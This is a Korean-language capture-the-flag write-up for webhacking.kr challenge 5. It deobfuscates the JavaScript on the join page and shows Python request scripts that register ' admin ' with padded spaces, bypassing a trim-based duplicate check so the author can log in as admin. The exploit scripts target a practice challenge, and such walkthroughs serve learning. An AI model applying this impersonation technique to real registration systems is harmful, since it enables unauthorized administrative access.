================================================================================================================
[webhacking.kr] 05
================================================================================================================

|

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4 -> step6 -> step8;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5 -> step7 -> step9;
        }
        step0 -> step1[label="join.php",arrowhead="normal"];
        step3 -> step2[label="javascript Obfuscated",arrowhead="normal"];
        step4 -> step5[label="id= admin&pw=1234",arrowhead="normal"];
        step7 -> step6[label="@solve",arrowhead="normal"];
    }

|

Source analysis
================================================================================================================

- 해당 페이지에는 Login과 Join 버튼만 존재하는데 Join 버튼을 클릭할 경우 'Access_Denied'가 된다.
- Login 버튼을 클릭하면 로그인 페이지가 뜨게 되는데 특별한 부분을 확인할 수 없다.
- Login 버튼 클릭시 login.php로 접근하므로 join.php로 접근을 해보니 검은 바탕화면이 나타나는데 해당 소스를 확인할 수 있었다.

.. code-block:: html

    
    <html>
    <title>Challenge 5</title></head><body bgcolor=black><center>
    <script>
    l='a';ll='b';lll='c';llll='d';lllll='e';llllll='f';lllllll='g';llllllll='h';lllllllll='i';llllllllll='j';lllllllllll='k';llllllllllll='l';lllllllllllll='m';llllllllllllll='n';lllllllllllllll='o';llllllllllllllll='p';lllllllllllllllll='q';llllllllllllllllll='r';lllllllllllllllllll='s';llllllllllllllllllll='t';lllllllllllllllllllll='u';llllllllllllllllllllll='v';lllllllllllllllllllllll='w';llllllllllllllllllllllll='x';lllllllllllllllllllllllll='y';llllllllllllllllllllllllll='z';I='1';II='2';III='3';IIII='4';IIIII='5';IIIIII='6';IIIIIII='7';IIIIIIII='8';IIIIIIIII='9';IIIIIIIIII='0';li='.';ii='<';iii='>';lIllIllIllIllIllIllIllIllIllIl=lllllllllllllll+llllllllllll+llll+llllllllllllllllllllllllll+lllllllllllllll+lllllllllllll+ll+lllllllll+lllll;
    lIIIIIIIIIIIIIIIIIIl=llll+lllllllllllllll+lll+lllllllllllllllllllll+lllllllllllll+lllll+llllllllllllll+llllllllllllllllllll+li+lll+lllllllllllllll+lllllllllllllll+lllllllllll+lllllllll+lllll;if(eval(lIIIIIIIIIIIIIIIIIIl).indexOf(lIllIllIllIllIllIllIllIllIllIl)==-1) { bye; }if(eval(llll+lllllllllllllll+lll+lllllllllllllllllllll+lllllllllllll+lllll+llllllllllllll+llllllllllllllllllll+li+'U'+'R'+'L').indexOf(lllllllllllll+lllllllllllllll+llll+lllll+'='+I)==-1){alert('access_denied');history.go(-1);}else{document.write('<font size=2 color=white>Join</font><p>');document.write('.<p>.<p>.<p>.<p>.<p>');document.write('<form method=post action='+llllllllll+lllllllllllllll+lllllllll+llllllllllllll+li+llllllllllllllll+llllllll+llllllllllllllll
    +'>');document.write('<table border=1><tr><td><font color=gray>id</font></td><td><input type=text name='+lllllllll+llll+' maxlength=5></td></tr>');document.write('<tr><td><font color=gray>pass</font></td><td><input type=text name='+llllllllllllllll+lllllllllllllllllllllll+' maxlength=10></td></tr>');document.write('<tr align=center><td colspan=2><input type=submit></td></tr></form></table>');}
    </script>
    </body>
    </html>

javascript로 된 페이지로 해당 난독화 부분을 복호화해보자.

.. code-block:: html
    
    < html >
    < title > Challenge 5 < /title></head > < body bgcolor = black > < center >
    < script >
    l = 'a';
	ll = 'b';
	lll = 'c';
	llll = 'd';
	lllll = 'e';
	llllll = 'f';
	lllllll = 'g';
	llllllll = 'h';
	lllllllll = 'i';
	llllllllll = 'j';
	lllllllllll = 'k';
	llllllllllll = 'l';
	lllllllllllll = 'm';
	llllllllllllll = 'n';
	lllllllllllllll = 'o';
	llllllllllllllll = 'p';
	lllllllllllllllll = 'q';
	llllllllllllllllll = 'r';
	lllllllllllllllllll = 's';
	llllllllllllllllllll = 't';
	lllllllllllllllllllll = 'u';
	llllllllllllllllllllll = 'v';
	lllllllllllllllllllllll = 'w';
	llllllllllllllllllllllll = 'x';
	lllllllllllllllllllllllll = 'y';
	llllllllllllllllllllllllll = 'z';
	I = '1';
	II = '2';
	III = '3';
	IIII = '4';
	IIIII = '5';
	IIIIII = '6';
	IIIIIII = '7';
	IIIIIIII = '8';
	IIIIIIIII = '9';
	IIIIIIIIII = '0';
	li = '.';
	ii = '<';
	iii = '>';
	lIllIllIllIllIllIllIllIllIllIl = lllllllllllllll + llllllllllll + llll + llllllllllllllllllllllllll + lllllllllllllll + lllllllllllll + ll + lllllllll + lllll;
	lIIIIIIIIIIIIIIIIIIl = llll + lllllllllllllll + lll + lllllllllllllllllllll + lllllllllllll + lllll + llllllllllllll + llllllllllllllllllll + li + lll + lllllllllllllll + lllllllllllllll + lllllllllll + lllllllll + lllll;
	if (eval(lIIIIIIIIIIIIIIIIIIl).indexOf(lIllIllIllIllIllIllIllIllIllIl) == -1) {
	    bye;
	}
	if (eval(llll + lllllllllllllll + lll + lllllllllllllllllllll + lllllllllllll + lllll + llllllllllllll + llllllllllllllllllll + li + 'U' + 'R' + 'L').indexOf(lllllllllllll + lllllllllllllll + llll + lllll + '=' + I) == -1) {
	    alert('access_denied');
	    history.go(-1);
	} else {
	    document.write('<font size=2 color=white>Join</font><p>');
	    document.write('.<p>.<p>.<p>.<p>.<p>');
	    document.write('<form method=post action=join.php>');
	    document.write('<table border=1><tr><td><font color=gray>id</font></td><td><input type=text name=id maxlength=5></td></tr>');
	    document.write('<tr><td><font color=gray>pass</font></td><td><input type=text name=pw maxlength=10></td></tr>');
	    document.write('<tr align=center><td colspan=2><input type=submit></td></tr></form></table>');
	} < /script> < /body> < /html>

|

trim 함수 우회
================================================================================================================

- 코드를 복호화해보면 join.php로 id, pw 파라미터를 통해 가입을 하는 것을 확인할 수 있다. 
- 해당 페이지로 admin을 가입하면 오류 메시지가 발생하는데 space를 넣어 가입할 경우 정상적으로 가입된다. 
- 아마, trim 함수를 통해 id를 확인하는 것으로 보인다.

.. code-block:: python

    import requests

    url = "http://webhacking.kr/challenge/web/web-05/mem/join.php"
    cookies = {
        "PHPSESSID":"9johqp6c81c5hf11lkomnghhn6"
    }
    data = {
        "id":" admin ",
        "pw":"1234"
    }

    r = requests.post(url, data=data, cookies = cookies, verify=False)

    print r.content

|

solve
================================================================================================================

- 가입한 계정으로 로그인을 진행하면 로그인 성공!

.. code-block:: python

    import requests

    url = "http://webhacking.kr/challenge/web/web-05/mem/login.php"
    cookies = {
        "PHPSESSID":"9johqp6c81c5hf11lkomnghhn6"
    }
    data = {
        "id":" admin",
        "pw":"1234"
    }

    r = requests.post(url, data=data, cookies = cookies, verify=False)

    print r.content